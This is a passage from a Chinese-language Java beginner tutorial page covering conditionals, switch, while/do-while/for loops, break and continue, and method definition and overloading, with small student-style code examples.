class_">Scanner</span>(System.in);</span><br><span class="line">    System.out.println(<span class="string">&quot;请输入考试成绩：&quot;</span>);</span><br><span class="line">    <span class="type">int</span> sorce=scanner.nextInt();</span><br><span class="line">    <span class="keyword">if</span>(sorce==<span class="number">100</span>)&#123;</span><br><span class="line">        System.out.println(<span class="string">&quot;恭喜你，成绩满分！太棒了&quot;</span>);</span><br><span class="line">    &#125;<span class="keyword">else</span> <span class="keyword">if</span>(sorce&lt;<span class="number">100</span>&amp;&amp;sorce&gt;<span class="number">90</span>)&#123;</span><br><span class="line">        System.out.println(<span class="string">&quot;！还不错呦&quot;</span>);</span><br><span class="line">    &#125;<span class="keyword">else</span> <span class="keyword">if</span>(sorce&lt;<span class="number">90</span>&amp;&amp;sorce&gt;<span class="number">80</span>)&#123;</span><br><span class="line">        System.out.println(<span class="string">&quot;继续努力，你可以变得更好&quot;</span>);</span><br><span class="line">            &#125; <span class="keyword">else</span> <span class="keyword">if</span> (sorce&lt;<span class="number">80</span>&amp;&amp;sorce&gt;<span class="number">70</span>) &#123;</span><br><span class="line">        System.out.println(<span class="string">&quot;有点落下了，快点跟上啊！！！！&quot;</span>);</span><br><span class="line"></span><br><span class="line">    &#125; <span class="keyword">else</span> <span class="keyword">if</span> (sorce&lt;<span class="number">70</span>&amp;&amp;sorce&gt;<span class="number">60</span>) &#123;</span><br><span class="line">        System.out.println(<span class="string">&quot;不要灰心，相信你可以的！！&quot;</span>);</span><br><span class="line"></span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">else</span>  &#123;</span><br><span class="line">        System.out.println(<span class="string">&quot;别学了，回家种地吧！！！&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">&#125;</span><br></pre></td></tr></table></div></figure>


        <h4 id="if嵌套结构">
          <a href="#if嵌套结构" class="heading-link"><i class="fas fa-link"></i></a><a href="#if嵌套结构" class="headerlink" title="if嵌套结构"></a>if嵌套结构</h4>
      <figure class="highlight plaintext"><div class="table-container"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">if(布尔表达式)&#123;</span><br><span class="line"></span><br><span class="line">if(布尔表达式)&#123;</span><br><span class="line"></span><br><span class="line">&#125;&#125;</span><br></pre></td></tr></table></div></figure>

<p>####switch多选择结构</p>
<p>switch语句中变量类型可以是：</p>
<p>byte,short,int char</p>
<p>从javaSE7开始</p>
<p>switch支持String类型</p>
<p>同事case标签必须为字符串常量或字面量</p>
<figure class="highlight java"><div class="table-container"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">switch</span>(expression)&#123;</span><br><span class="line"></span><br><span class="line"><span class="keyword">case</span> value:</span><br><span class="line"></span><br><span class="line"><span class="comment">//语句</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">break</span>:<span class="comment">//可选</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">case</span> value：</span><br><span class="line"></span><br><span class="line"><span class="comment">//语句</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">break</span>;</span><br><span class="line"><span class="comment">//你可以有任意数量的case语句</span></span><br><span class="line"><span class="keyword">default</span>:<span class="comment">//可选</span></span><br><span class="line"><span class="comment">//语句</span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></div></figure>

<p>###循环结构</p>

        <h4 id="while循环">
          <a href="#while循环" class="heading-link"><i class="fas fa-link"></i></a><a href="#while循环" class="headerlink" title="while循环"></a>while循环</h4>
      <figure class="highlight plaintext"><div class="table-container"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">while（布尔表达式）&#123;</span><br><span class="line"></span><br><span class="line">//循环内容</span><br><span class="line"></span><br><span class="line">&#125;</span><br></pre></td></tr></table></div></figure>

<p>只要布尔表达式为true，循环就会一直执行下去。<br>我们大多数情况是会让循环停止下来的，我们需要一个让表达式失效的方式来结束循环。少部分情况需要循环一直执行，比如服务器的请求响应监听等。<br>循环条件一直为true就会造成无限循环【死循环】，我们正常的业务编程中应该尽量避免死循环。会影响程序性能或者造成程序卡死奔溃!</p>
<figure class="highlight java"><div class="table-container"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">package</span> com.qingchuan.struct;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">WhilDemo01</span> &#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span> &#123;</span><br><span class="line">        <span class="comment">//输出1-100</span></span><br><span class="line">         <span class="type">int</span> i=<span class="number">0</span>;</span><br><span class="line">         <span class="keyword">while</span>(i&lt;<span class="number">100</span>)&#123;</span><br><span class="line">             i++;</span><br><span class="line">             System.out.println(i);</span><br><span class="line">         &#125;</span><br><span class="line"><span class="comment">//        System.out.println();</span></span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></div></figure>

<figure class="highlight java"><div class="table-container"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">package</span> com.qingchuan.struct;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">WhileDemo03</span> &#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span> &#123;</span><br><span class="line">        <span class="type">int</span> i=<span class="number">0</span>;</span><br><span class="line">        <span class="type">int</span> sum=<span class="number">0</span>;</span><br><span class="line">        <span class="keyword">while</span>(i&lt;=<span class="number">100</span>)&#123;</span><br><span class="line">            sum=sum+i;</span><br><span class="line">            i++;</span><br><span class="line">        &#125;</span><br><span class="line">        System.out.println(sum);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></div></figure>


        <h4 id="do…while循环">
          <a href="#do…while循环" class="heading-link"><i class="fas fa-link"></i></a><a href="#do…while循环" class="headerlink" title="do…while循环"></a>do…while循环</h4>
      <p>对于while语句而言，如果不满足条件，则不能进入循环。但有时候我们需要即使不满足条件也至少执行一次。<br>do…while循环和while循环相似，不同的是，do…while循环至少会执行一次。</p>
<figure class="highlight plaintext"><div class="table-container"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">do &#123;</span><br><span class="line">//代码语句</span><br><span class="line">&#125;while(布尔表达式);</span><br></pre></td></tr></table></div></figure>

<p>While和do-While的区别:<br>while先判断后执行。dowhile是先执行后判断!<br>Do…while总是保证循环体会被至少执行一次!这是他们的主要差别。</p>

        <h4 id="For循环">
          <a href="#For循环" class="heading-link"><i class="fas fa-link"></i></a><a href="#For循环" class="headerlink" title="For循环"></a>For循环</h4>
      <p>虽然所有循环结构都可以用while或者do…while表示，但Java提供了另一种语句——fo循环，使一些循环结构变得更加简单。<br>for循环语句是支持迭代的一种通用结构，是最有效、最灵活的循环结构。for循环执行的次数是在执行前就确定的。语法格式如下:</p>
<figure class="highlight plaintext"><div class="table-container"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">for(初始化;布尔表达式;更新)&#123;</span><br><span class="line">//代码语句</span><br><span class="line">&#125;</span><br></pre></td></tr></table></div></figure>

<p><strong>100.for</strong>接回车自动生成for循环语句</p>
<figure class="highlight java"><div class="table-container"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">package</span> com.qingchuan.struct;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">ForDemo01</span> &#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span> &#123;</span><br><span class="line">        <span class="type">int</span> a=<span class="number">1</span>;<span class="comment">//初始化条件</span></span><br><span class="line">        <span class="keyword">while</span>(a&lt;=<span class="number">100</span>)&#123;</span><br><span class="line">            System.out.println(a);</span><br><span class="line">            a+=<span class="number">2</span>;<span class="comment">//迭代</span></span><br><span class="line">        &#125;</span><br><span class="line">        System.out.println(<span class="string">&quot;while循环结束&quot;</span>);</span><br><span class="line">        <span class="keyword">for</span>(<span class="type">int</span> i=<span class="number">1</span>;i&lt;=<span class="number">100</span>;i++)&#123;</span><br><span class="line">            System.out.println(i);</span><br><span class="line">        &#125;</span><br><span class="line">        System.out.println(<span class="string">&quot;for循环结束&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;<span class="comment">/*</span></span><br><span class="line"><span class="comment">    关于 for循环有以下几点说明:</span></span><br><span class="line"><span class="comment">        最先执行初始化步骤。可以声明一种类型，但可初始化一个或多个循环控制变量，也可以是空语句。</span></span><br><span class="line"><span class="comment">        然后，检测布尔表达式的值。如果为 true，循环体被执行。如果为false，循环终止，开始执行循环体后面的语句。执行一次循环后，更新循环控制变量(迭代因子控制循环变量的增减)。</span></span><br><span class="line"><span class="comment">        再次检测布尔表达式。循环执行上面的过程。</span></span><br><span class="line"><span class="comment">        */</span></span><br></pre></td></tr></table></div></figure>

<p>计算0到100之间所有奇数和偶数的和</p>
<figure class="highlight java"><div class="table-container"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">package</span> com.qingchuan.struct;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">ForDemo02</span> &#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span> &#123;</span><br><span class="line">        <span class="type">int</span> oddsum=<span class="number">0</span>;</span><br><span class="line">        <span class="type">int</span> evensum=<span class="number">0</span>;</span><br><span class="line">        <span class="keyword">for</span>(<span class="type">int</span> i=<span class="number">0</span>;i&lt;=<span class="number">100</span>;i++)&#123;</span><br><span class="line">            <span class="keyword">if</span>(i%<span class="number">2</span>!=<span class="number">0</span>)&#123;</span><br><span class="line">                oddsum+=i;</span><br><span class="line">            &#125;</span><br><span class="line">            <span class="keyword">else</span>&#123;</span><br><span class="line">                evensum+=i;</span><br><span class="line">            &#125;</span><br><span class="line"></span><br><span class="line">        &#125;</span><br><span class="line">        System.out.println(oddsum);</span><br><span class="line">        System.out.println(evensum);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></div></figure>

<p>用while循环或for循环输出1-1000之间能被5整除的数，并每行输出3个</p>
<figure class="highlight java"><div class="table-container"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">package</span> com.qingchuan.struct;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">ForDemo03</span> &#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span> &#123;</span><br><span class="line">        <span class="keyword">for</span> (<span class="type">int</span> <span class="variable">i</span> <span class="operator">=</span> <span class="number">0</span>; i &lt; <span class="number">1000</span>; i++) &#123;</span><br><span class="line">            <span class="keyword">if</span>(i%<span class="number">5</span>==<span class="number">0</span>)&#123;</span><br><span class="line">                System.out.print(i+<span class="string">&quot;\t&quot;</span>);</span><br><span class="line">            &#125;</span><br><span class="line">            <span class="keyword">if</span>(i%(<span class="number">5</span>*<span class="number">3</span>)==<span class="number">0</span>)&#123;</span><br><span class="line">                System.out.println();</span><br><span class="line">            &#125;</span><br><span class="line"></span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></div></figure>


        <h4 id="打印九九乘法表">
          <a href="#打印九九乘法表" class="heading-link"><i class="fas fa-link"></i></a><a href="#打印九九乘法表" class="headerlink" title="打印九九乘法表"></a>打印九九乘法表</h4>
      <figure class="highlight java"><div class="table-container"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">package</span> com.qingchuan.struct;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">ForDemo04</span> &#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span> &#123;</span><br><span class="line">        <span class="keyword">for</span> (<span class="type">int</span> <span class="variable">j</span> <span class="operator">=</span> <span class="number">1</span>; j &lt;=<span class="number">9</span>; j++) &#123;</span><br><span class="line">            <span class="keyword">for</span> (<span class="type">int</span> <span class="variable">i</span> <span class="operator">=</span> <span class="number">1</span>; i &lt;= j; i++) &#123;</span><br><span class="line">                System.out.print(j+<span class="string">&quot;*&quot;</span>+i+<span class="string">&quot;=&quot;</span>+(j*i)+<span class="string">&quot;\t&quot;</span>);</span><br><span class="line">            &#125;</span><br><span class="line">            System.out.println();</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></div></figure>

<p>####增强for循环</p>
<figure class="highlight plaintext"><div class="table-container"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">for(声明语句：表达式)&#123;</span><br><span class="line"></span><br><span class="line">//代码句子</span><br><span class="line"></span><br><span class="line">&#125;</span><br></pre></td></tr></table></div></figure>

<p>声明语句:声明新的局部变量，该变量的类型必须和数组元素的类型匹配。其作用域限定在循环语句块，其值与此时数组元素的值相等。</p>
<p>表达式:表达式是要访问的数组名，或者是返回值为数组的方法。</p>
<figure class="highlight java"><div class="table-container"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">package</span> com.qingchuan.struct;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">ForDemo05</span> &#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span> &#123;</span><br><span class="line">        <span class="type">int</span> []numbers=&#123;<span class="number">10</span>,<span class="number">20</span>,<span class="number">30</span>,<span class="number">40</span>&#125;;<span class="comment">//定义了一个数组</span></span><br><span class="line">        <span class="keyword">for</span>(<span class="type">int</span> i=<span class="number">0</span>;i&lt;<span class="number">4</span>;i++)&#123;</span><br><span class="line">            System.out.println(numbers[i]);</span><br><span class="line">        &#125;</span><br><span class="line">        System.out.println (<span class="string">&quot;---------分割线--------------&quot;</span>);</span><br><span class="line"></span><br><span class="line">        <span class="comment">//遍历数组的元素</span></span><br><span class="line">        <span class="keyword">for</span>(<span class="type">int</span> x:numbers)&#123;</span><br><span class="line">            System.out.println(x);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></div></figure>


        <h4 id="break-continue">
          <a href="#break-continue" class="heading-link"><i class="fas fa-link"></i></a><a href="#break-continue" class="headerlink" title="break&amp;&amp;continue"></a>break&amp;&amp;continue</h4>
      <p>break在任何循环语句的主体部分，均可用break控制循环的流程。break用于强行退出循环，<strong>不执行循环中剩余的语句</strong>。(break语句也在switch语句中使用)</p>
<p>continue语句用在循环语句体中，用于<strong>终止某次循环过程</strong>，即跳过循环体中尚未执行的语句，接着进行下一次是否执行循环的判定。<br><strong>关于goto关键字</strong><br>goto关键字很早就在程序设计语言中出现。尽管goto仍是Java的一个保留字，但并未在语言中得到正式使用;Java没有goto。然而，在break和continue这两个关键字的身上，我们仍然能看出一些goto的影子—带标签的break和continue.<br>“标签”是指后面跟一个冒号的标识符，例如:</p>
<p>对Java来说唯一用到标签的地方是在循环语句之前。而在循环之前设置标签的唯一理由是:我们希望在其中嵌套另-个循环，由于break和continue关键字通常只中断当前循环，但若随同标签使用，它们就会中断到存在标签的地方。</p>

        <h4 id="打印三角形">
          <a href="#打印三角形" class="heading-link"><i class="fas fa-link"></i></a><a href="#打印三角形" class="headerlink" title="打印三角形"></a>打印三角形</h4>
      <figure class="highlight java"><div class="table-container"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">package</span> com.qingchuan.struct;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">TestDemo01</span> &#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span> &#123;</span><br><span class="line">        <span class="comment">//打印三角形  5行</span></span><br><span class="line">        <span class="keyword">for</span> (<span class="type">int</span> <span class="variable">i</span> <span class="operator">=</span> <span class="number">1</span>; i &lt; <span class="number">6</span>; i++) &#123;</span><br><span class="line">            <span class="keyword">for</span> (<span class="type">int</span> <span class="variable">j</span> <span class="operator">=</span> <span class="number">5</span>; j&gt;=i ;j--) &#123;</span><br><span class="line">                System.out.print(<span class="string">&quot; &quot;</span>);</span><br><span class="line">            &#125;</span><br><span class="line">            <span class="keyword">for</span>(<span class="type">int</span> j=<span class="number">1</span>;j&lt;=i;j++) &#123;</span><br><span class="line">                System.out.print(<span class="string">&quot;*&quot;</span>);</span><br><span class="line">            &#125;</span><br><span class="line">            <span class="keyword">for</span> (<span class="type">int</span> j=<span class="number">1</span>;j&lt;i;j++)&#123;</span><br><span class="line">                System.out.print(<span class="string">&quot;*&quot;</span>);</span><br><span class="line">            &#125;</span><br><span class="line">            System.out.println();</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></div></figure>


        <h2 id="Java方法">
          <a href="#Java方法" class="heading-link"><i class="fas fa-link"></i></a><a href="#Java方法" class="headerlink" title="Java方法"></a>Java方法</h2>
      <p>什么是方法？</p>
<p>Java方法是语句的集合，它们在一起执行一个功能。<br>方法是解决一类问题的步骤的有序组合<br>方法包含于类或对象中<br>◆方法在程序中被创建，在其他地方被引用<br>设计方法的原则:方法的本意是功能块，就是实现某个功能的语句块的集合。我们设计方法的时候，最好保持方法的原子性，就是一个方法只完成1个功能，这样利于我们后期的扩展。</p>
<figure class="highlight java"><div class="table-container"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">package</span> com.qingchuan.Method;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">Demo01</span> &#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span> &#123;</span><br><span class="line"><span class="comment">//        int sum = add(1,2);</span></span><br><span class="line"><span class="comment">//        System.out.println(sum);</span></span><br><span class="line">        test();</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="comment">//加法</span></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="type">int</span> <span class="title function_">add</span><span class="params">(<span class="type">int</span> a,<span class="type">int</span> b)</span>&#123;</span><br><span class="line">        <span class="keyword">return</span> a+b;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span>  <span class="keyword">void</span> <span class="title function_">test</span><span class="params">()</span>&#123;</span><br><span class="line">        <span class="keyword">for</span> (<span class="type">int</span> <span class="variable">i</span> <span class="operator">=</span> <span class="number">0</span>; i &lt; <span class="number">1000</span>; i++) &#123;</span><br><span class="line">            <span class="keyword">if</span> (i % <span class="number">5</span> == <span class="number">0</span>) &#123;</span><br><span class="line">                System.out.print(i + <span class="string">&quot;\t&quot;</span>);</span><br><span class="line">            &#125;</span><br><span class="line">            <span class="keyword">if</span> (i % (<span class="number">5</span> * <span class="number">3</span>) == <span class="number">0</span>) &#123;</span><br><span class="line">                System.out.println();</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></div></figure>


        <h4 id="方法的定义">
          <a href="#方法的定义" class="heading-link"><i class="fas fa-link"></i></a><a href="#方法的定义" class="headerlink" title="方法的定义"></a>方法的定义</h4>
      <p>Java的方法类似于其它语言的函数，是一段用来完成特定功能的代码片段，一般情况下，定义一个方法包含以下语法:<br>方法包含一个方法头和一个方法体。下面是一个方法的所有部分:<br>修饰符:修饰符，这是可选的，告诉编译器如何调用该方法。定义了该方法的访问类型。<br>返回值类型∶方法可能会返回值。returnValueType是方法返回值的数据类型。有些方法执行所需的操作，但没有返回值。在这种情况下，returnValueType是关键字void。<br>方法名:是方法的实际名称。方法名和参数表共同构成方法签名。<br>参数类型:参数像是一个占位符。当方法被调用时，传递值给参数。这个值被称为实参或变量。参数列表是指方法的参数类型、顺序和参数的个数。参数是可选的，方法可以不包含任何参数。<br>形式参数:在方法被调用时用于接收外界输入的数据。</p>
<p>实参:调用方法时实际传给方法的数据。<br>方法体:方法体包含具体的语句，定义该方法的功能。</p>
<figure class="highlight java"><div class="table-container"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">修饰符返回值类型方法名(参数类型参数名)&#123;</span><br><span class="line">。。。</span><br><span class="line">方法体</span><br><span class="line">。。。</span><br><span class="line"><span class="keyword">return</span> 返回值；&#125;</span><br><span class="line"></span><br></pre></td></tr></table></div></figure>

<figure class="highlight java"><div class="table-container"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">package</span> com.qingchuan.Method;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">Demo02</span> &#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span> &#123;</span><br><span class="line">        <span class="type">int</span> max=max(<span class="number">10</span>,<span class="number">10</span>);</span><br><span class="line">        System.out.println(max);</span><br><span class="line"></span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="type">int</span> <span class="title function_">max</span><span class="params">(<span class="type">int</span> num1,<span class="type">int</span> num2)</span>&#123;</span><br><span class="line">        <span class="type">int</span> result=<span class="number">0</span>;</span><br><span class="line">        <span class="keyword">if</span>(num1==num2)&#123;</span><br><span class="line">            System.out.println(<span class="string">&quot;num1=num2&quot;</span>);</span><br><span class="line">            <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">if</span>(num1&gt;num2)&#123;</span><br><span class="line">            result=num1;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">if</span> (num1&lt;num2)&#123;</span><br><span class="line">            result=num2;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">return</span> result;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></div></figure>

<p><strong>java都是值传递</strong></p>

        <h4 id="方法的重载">
          <a href="#方法的重载" class="heading-link"><i class="fas fa-link"></i></a><a href="#方法的重载" class="headerlink" title="方法的重载"></a>方法的重载</h4>
      <blockquote>
<p>重截就是在一个类中有相同的函数名称，但形参不同的函数。<br>方法的重载的规则:<br>方法名称必须相同。<br>参数列表必须不同(个数不同、或类型不同、参数排列顺序不同等)。方法的返回类型可以相同也可以不相同。<br>仅仅返回类型不同不足以成为方法的重载。<br>实现理论:<br>方法名称相同时，编译器会根据调用方法的参数个数、参数类型等去逐个匹配，以选择对应的方法，如果匹配失败，则编译器报错。</p>
</blockquote>
<figure class="highlight java"><div class="table-container"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">package</span> com.qingchuan.Method;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">Demo03</span> &#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span> &#123;</span><br><span class="line"></span><br><span 